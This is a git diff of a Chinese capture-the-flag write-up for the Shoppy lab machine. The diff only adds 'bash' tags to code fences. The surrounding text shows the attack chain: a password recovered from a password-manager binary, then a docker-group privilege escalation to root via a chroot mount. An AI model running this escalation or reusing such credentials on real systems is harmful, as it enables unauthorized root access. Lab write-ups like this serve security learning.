@@ -69,7 +69,7 @@ SSH登陆成功。
 
 ## get user flag
 
-```
+```bash
 jaeger@shoppy:~$ cat user.txt
 ```
 
@@ -77,7 +77,7 @@ jaeger@shoppy:~$ cat user.txt
 ## 横向移动
 
 首先看看 `sudo -l`：  
-```
+```bash
 jaeger@shoppy:~$ id
 uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
 
@@ -113,7 +113,7 @@ Access denied! This incident will be reported !
 
 *看了眼WP，竟然是用 `cat password-manager` 能发现有用的信息，服了。一直惯性觉得cat二进制文件没用每次都直接strings了……*
 
-```
+```bash
 jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
 Welcome to Josh password manager!
 Please enter your master password: Sample
@@ -124,7 +124,7 @@ password: Deploying@pp!
 ```
 
 SSH成功登陆 `deploy` 用户。
-```
+```bash
 $ id
 uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
 ```
@@ -134,7 +134,7 @@ uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
 
 `deploy` 用户的这个 `998(docker)` 是什么情况，值得探究一下。  
 通过[gtfobins](https://gtfobins.github.io/gtfobins/docker/)发现可以利用。运行下面命令后成功得到root shell：  
-```
+```bash
 $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # id
 uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
@@ -143,7 +143,7 @@ uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10
 
 ## get root flag
 
-```
+```bash
 # cd
 # ls
 root.txt
